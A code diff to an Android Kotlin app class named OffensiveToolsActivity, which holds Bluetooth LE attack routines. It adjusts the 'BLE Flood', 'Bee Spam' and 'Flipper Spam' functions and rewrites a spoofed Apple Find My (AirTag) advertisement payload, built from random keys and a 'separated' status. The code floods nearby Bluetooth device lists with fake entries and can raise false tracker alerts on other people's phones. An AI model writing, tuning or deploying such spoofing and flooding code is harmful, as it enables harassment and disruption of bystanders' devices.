@@ -240,13 +240,13 @@ class OffensiveToolsActivity : Activity() {
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("BLE Flood") { startBleFlood() }
         }
-        content.addView(buildAttackButton("BEE SPAM", "30 bee-themed devices swarm every BLE list", tc))
+        content.addView(buildAttackButton("BEE SPAM", "30 bee-themed devices flood every Bluetooth list", tc))
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
             confirmAndRun("Bee Spam") { startBeeSpam() }
         }
-        content.addView(buildAttackButton("FLIPPER BLE SPAM", "Spoofed Flipper Zero HID devices", tc))
+        content.addView(buildAttackButton("FLIPPER SPAM", "Flood Bluetooth lists with spoofed Flipper Zero names", tc))
         (content.getChildAt(content.childCount - 1) as LinearLayout).setOnClickListener {
-            confirmAndRun("Flipper BLE Spam") { startFlipperSpam() }
+            confirmAndRun("Flipper Spam") { startFlipperSpam() }
         }
 
         // Section: RF / Drone
@@ -550,11 +550,6 @@ class OffensiveToolsActivity : Activity() {
                     } catch (_: SecurityException) {}
 
                     val adData = android.bluetooth.le.AdvertiseData.Builder()
-                        .setIncludeDeviceName(false)
-                        .setIncludeTxPowerLevel(false)
-                        .build()
-
-                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                         .setIncludeDeviceName(true)
                         .setIncludeTxPowerLevel(false)
                         .build()
@@ -579,14 +574,14 @@ class OffensiveToolsActivity : Activity() {
                         .build()
 
                     try {
-                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
+                        advertiser?.startAdvertising(settings, adData, currentCallback)
                     } catch (_: SecurityException) {
                         statusText?.text = "PERMISSION DENIED"
                         isAttacking = false
                     }
-                }, 50)
+                }, 250)
 
-                handler.postDelayed(this, 400)
+                handler.postDelayed(this, 1000)
             }
         }
         handler.post(runnable)
@@ -625,7 +620,7 @@ class OffensiveToolsActivity : Activity() {
         handler.post(runnable)
     }
 
-    // ─── FLIPPER BLE SPAM ───
+    // ─── FLIPPER SPAM ───
     private fun startFlipperSpam() {
         if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED) {
             requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_CONNECT, android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
@@ -652,15 +647,7 @@ class OffensiveToolsActivity : Activity() {
                         currentCallback?.let { advertiser?.stopAdvertising(it) }
                     } catch (_: SecurityException) {}
 
-                    val hidServiceUuid = android.os.ParcelUuid.fromString("00001812-0000-1000-8000-00805F9B34FB")
-
                     val adData = android.bluetooth.le.AdvertiseData.Builder()
-                        .setIncludeDeviceName(false)
-                        .setIncludeTxPowerLevel(false)
-                        .addServiceUuid(hidServiceUuid)
-                        .build()
-
-                    val scanResponse = android.bluetooth.le.AdvertiseData.Builder()
                         .setIncludeDeviceName(true)
                         .setIncludeTxPowerLevel(false)
                         .build()
@@ -685,14 +672,14 @@ class OffensiveToolsActivity : Activity() {
                         .build()
 
                     try {
-                        advertiser?.startAdvertising(settings, adData, scanResponse, currentCallback)
+                        advertiser?.startAdvertising(settings, adData, currentCallback)
                     } catch (_: SecurityException) {
                         statusText?.text = "PERMISSION DENIED"
                         isAttacking = false
                     }
-                }, 50)
+                }, 250)
 
-                handler.postDelayed(this, 500)
+                handler.postDelayed(this, 1000)
             }
         }
         handler.post(runnable)
@@ -753,23 +740,19 @@ class OffensiveToolsActivity : Activity() {
 
                 val rand = java.util.Random()
 
-                // Minimal Find My payload (type 0x12)
-                // Matches real AirTag ad structure but with random keys
-                val payload = ByteArray(19)
-                payload[0] = 0x12           // Continuity type: Find My
-                payload[1] = 0x02           // Length
-                payload[2] = 0x10           // Status: separated
-                // 6 bytes of random "public key" fragment (enough to look unique)
-                for (i in 3 until 9) payload[i] = rand.nextInt(256).toByte()
-                // Hint byte
-                payload[9] = rand.nextInt(4).toByte()
-                // Remaining random padding
-                for (i in 10 until 19) payload[i] = rand.nextInt(256).toByte()
+                // Apple Find My "Nearby" advertisement.
+                // [0]=type 0x12, [1]=TLV length of bytes after this header,
+                // [2]=status 0x10 separated, [3..] random key fragment.
+                val payload = ByteArray(25)
+                payload[0] = 0x12
+                payload[1] = (payload.size - 2).toByte()
+                payload[2] = 0x10
+                for (i in 3 until payload.size) payload[i] = rand.nextInt(256).toByte()
 
                 val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
 
-                handler.postDelayed(this, 600)
+                handler.postDelayed(this, 1500)
             }
         }
         handler.post(runnable)
